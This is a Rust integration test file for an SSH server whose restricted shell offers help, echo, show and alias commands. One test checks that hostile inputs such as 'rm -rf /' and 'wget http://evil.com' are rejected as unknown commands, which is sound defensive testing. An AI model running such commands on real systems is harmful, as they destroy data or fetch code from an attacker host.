#[allow(dead_code, unused_imports)]
mod helpers;

use helpers::*;
use std::sync::Arc;
use tokio::time::Duration;

/// Execute a command via SSH exec_request (ssh user@host "command")
/// Retries up to 5 times with exponential backoff to handle transient failures
/// under parallel test load.
async fn exec_command(port: u16, password: &str, command: &str) -> String {
    let mut last_err = String::new();
    for attempt in 0..5 {
        if attempt > 0 {
            tokio::time::sleep(Duration::from_millis(200 * (1 << attempt.min(3)))).await;
        }
        match try_exec_command(port, password, command).await {
            Ok(output) => return output,
            Err(e) => last_err = e,
        }
    }
    panic!("exec_command failed after 5 retries: {last_err}");
}

async fn try_exec_command(port: u16, password: &str, command: &str) -> Result<String, String> {
    let client_config = Arc::new(russh::client::Config::default());
    let mut handle = russh::client::connect(
        client_config,
        format!("127.0.0.1:{}", port),
        TestClientHandler,
    )
    .await
    .map_err(|e| format!("connect: {e}"))?;

    let ok = handle
        .authenticate_password("testuser", password)
        .await
        .map_err(|e| format!("auth: {e}"))?;
    assert!(ok.success(), "auth should succeed");

    let channel = handle
        .channel_open_session()
        .await
        .map_err(|e| format!("channel: {e}"))?;

    // Send exec request
    channel
        .exec(true, command)
        .await
        .map_err(|e| format!("exec: {e}"))?;

    // Read output
    let mut stream = channel.into_stream();
    let mut buf = vec![0u8; 4096];
    let mut output = String::new();

    loop {
        match tokio::time::timeout(
            Duration::from_secs(3),
            tokio::io::AsyncReadExt::read(&mut stream, &mut buf),
        )
        .await
        {
            Ok(Ok(0)) => break,
            Ok(Ok(n)) => output.push_str(&String::from_utf8_lossy(&buf[..n])),
            Ok(Err(_)) => break,
            Err(_) => break, // timeout
        }
    }

    Ok(output)
}

/// Execute a command via interactive shell (request_shell + type command)
async fn shell_command(port: u16, password: &str, command: &str) -> String {
    let client_config = Arc::new(russh::client::Config::default());
    let mut handle = russh::client::connect(
        client_config,
        format!("127.0.0.1:{}", port),
        TestClientHandler,
    )
    .await
    .unwrap();

    let ok = handle
        .authenticate_password("testuser", password)
        .await
        .unwrap();
    assert!(ok.success());

    let channel = handle.channel_open_session().await.unwrap();
    channel.request_shell(true).await.unwrap();

    // Read MOTD + prompt first (may arrive in multiple packets)
    let mut stream = channel.into_stream();
    let mut buf = vec![0u8; 4096];
    let mut initial = String::new();
    let deadline = tokio::time::Instant::now() + Duration::from_secs(5);
    loop {
        match tokio::time::timeout_at(
            deadline,
            tokio::io::AsyncReadExt::read(&mut stream, &mut buf),
        )
        .await
        {
            Ok(Ok(n)) if n > 0 => {
                initial.push_str(&String::from_utf8_lossy(&buf[..n]));
                if initial.contains("$ ") {
                    break;
                }
            }
            _ => break,
        }
    }

    // Send command + Enter
    let cmd_bytes = format!("{}\r", command);
    tokio::io::AsyncWriteExt::write_all(&mut stream, cmd_bytes.as_bytes())
        .await
        .unwrap();

    // Read response
    let mut output = String::new();
    loop {
        match tokio::time::timeout(
            Duration::from_secs(2),
            tokio::io::AsyncReadExt::read(&mut stream, &mut buf),
        )
        .await
        {
            Ok(Ok(0)) => break,
            Ok(Ok(n)) => {
                output.push_str(&String::from_utf8_lossy(&buf[..n]));
                // Stop when we see another prompt
                if output.contains("$") && output.len() > 5 {
                    break;
                }
            }
            Ok(Err(_)) => break,
            Err(_) => break,
        }
    }

    output
}

// ---------------------------------------------------------------------------
// Test 1: "show status" command
// ---------------------------------------------------------------------------

#[tokio::test]
async fn test_exec_show_status() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = exec_command(port, "pass", "show status").await;
    // Without ShellContext wired up, this returns "context not available".
    // Once the handler sets the context, it should contain session info.
    assert!(
        output.contains("User:") || output.contains("context not available"),
        "show status should return session info or context unavailable message, got: {}",
        output
    );
}

#[tokio::test]
async fn test_shell_show_status() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = shell_command(port, "pass", "show status").await;
    assert!(
        output.contains("User:") || output.contains("context not available"),
        "show status via shell should return session info or context unavailable, got: {}",
        output
    );
}

// ---------------------------------------------------------------------------
// Test 2: "help" command
// ---------------------------------------------------------------------------

#[tokio::test]
async fn test_exec_help_contains_available_commands() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = exec_command(port, "pass", "help").await;
    assert!(
        output.contains("Available commands"),
        "help should contain 'Available commands', got: {}",
        output
    );
}

#[tokio::test]
async fn test_exec_help_lists_basic_commands() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = exec_command(port, "pass", "help").await;
    assert!(
        output.contains("ls") && output.contains("cd") && output.contains("echo"),
        "help should list basic commands like ls, cd, echo, got: {}",
        output
    );
}

#[tokio::test]
async fn test_shell_help() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = shell_command(port, "pass", "help").await;
    assert!(
        output.contains("Available commands"),
        "help via shell should contain 'Available commands', got: {}",
        output
    );
}

#[tokio::test]
async fn test_exec_help_extended_commands() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = exec_command(port, "pass", "help").await;
    // Extended commands (show connections, etc.) are only listed when ShellContext is set.
    // This test documents the current behavior and will verify extended help once context is wired.
    if output.contains("show connections") {
        // Context is available: extended commands are shown
        assert!(
            output.contains("show status") && output.contains("show bandwidth"),
            "help with context should list all show subcommands, got: {}",
            output
        );
    } else {
        // Context not available: only basic commands are shown
        assert!(
            output.contains("ls") && output.contains("exit"),
            "help without context should still list basic commands, got: {}",
            output
        );
    }
}

// ---------------------------------------------------------------------------
// Test 3: "echo" command
// ---------------------------------------------------------------------------

#[tokio::test]
async fn test_exec_echo_hello_world() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = exec_command(port, "pass", "echo hello world").await;
    assert!(
        output.contains("hello world"),
        "echo should output 'hello world', got: {}",
        output
    );
}

#[tokio::test]
async fn test_shell_echo_hello_world() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = shell_command(port, "pass", "echo hello world").await;
    assert!(
        output.contains("hello world"),
        "echo via shell should output 'hello world', got: {}",
        output
    );
}

#[tokio::test]
async fn test_exec_echo_empty() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = exec_command(port, "pass", "echo").await;
    // echo with no args should produce an empty line (just "\r\n")
    assert!(
        output.contains("\r\n") || output.is_empty(),
        "echo with no args should produce empty or newline, got: {:?}",
        output
    );
}

// ---------------------------------------------------------------------------
// Test 4: Unknown command
// ---------------------------------------------------------------------------

#[tokio::test]
async fn test_exec_unknown_command() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = exec_command(port, "pass", "nonexistent").await;
    assert!(
        output.contains("command not found"),
        "unknown command should return 'command not found', got: {}",
        output
    );
}

#[tokio::test]
async fn test_shell_unknown_command() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = shell_command(port, "pass", "nonexistent").await;
    assert!(
        output.contains("command not found"),
        "unknown command via shell should return 'command not found', got: {}",
        output
    );
}

#[tokio::test]
async fn test_exec_unknown_command_shows_name() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = exec_command(port, "pass", "foobar123").await;
    assert!(
        output.contains("foobar123") && output.contains("command not found"),
        "error should include the command name 'foobar123', got: {}",
        output
    );
}

// ---------------------------------------------------------------------------
// Test 5: "alias" command
// ---------------------------------------------------------------------------

#[tokio::test]
async fn test_exec_alias_no_context() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = exec_command(port, "pass", "alias").await;
    // Without ShellContext, alias returns "context not available".
    // Once context is wired, it should return "No aliases defined".
    assert!(
        output.contains("No aliases") || output.contains("context not available"),
        "alias should return 'No aliases' or 'context not available', got: {}",
        output
    );
}

#[tokio::test]
async fn test_shell_alias() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = shell_command(port, "pass", "alias").await;
    assert!(
        output.contains("No aliases") || output.contains("context not available"),
        "alias via shell should return 'No aliases' or 'context not available', got: {}",
        output
    );
}

// ---------------------------------------------------------------------------
// Additional shell command tests
// ---------------------------------------------------------------------------

#[tokio::test]
async fn test_exec_show_no_subcommand() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = exec_command(port, "pass", "show").await;
    // Without context: "show: context not available"
    // With context: "Usage: show <connections|bandwidth|acl|status|history|fingerprint>"
    assert!(
        output.contains("Usage:") || output.contains("context not available"),
        "show without subcommand should show usage or context message, got: {}",
        output
    );
}

#[tokio::test]
async fn test_exec_show_connections() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = exec_command(port, "pass", "show connections").await;
    assert!(
        output.contains("No active") || output.contains("context not available"),
        "show connections should return connection info or context unavailable, got: {}",
        output
    );
}

#[tokio::test]
async fn test_exec_multiple_unknown_commands() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    // Test various unknown/blocked commands
    for cmd in &["rm -rf /", "bash", "wget http://evil.com", "python -c 'x'"] {
        let output = exec_command(port, "pass", cmd).await;
        assert!(
            output.contains("command not found"),
            "command '{}' should be blocked with 'command not found', got: {}",
            cmd,
            output
        );
    }
}

#[tokio::test]
async fn test_shell_show_bandwidth() {
    let port = free_port().await;
    let hash = hash_pass("pass");
    let _server = start_ssh(ssh_config(port, &hash)).await;

    let output = shell_command(port, "pass", "show bandwidth").await;
    assert!(
        output.contains("Download")
            || output.contains("unlimited")
            || output.contains("context not available"),
        "show bandwidth should return bandwidth info or context unavailable, got: {}",
        output
    );
}
